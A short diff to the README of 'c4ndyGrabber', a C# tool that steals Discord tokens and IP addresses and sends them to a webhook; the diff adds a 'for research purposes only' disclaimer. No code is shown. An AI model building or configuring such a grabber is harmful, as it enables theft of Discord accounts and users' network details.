@@ -1,4 +1,5 @@
 # c4ndyGrabber
+# FOR RESEARCH PURPOSES ONLY!
 C# Discord Token and IP grabber
 
 Remember to change `webhook` otherwise the report wont be able to come.
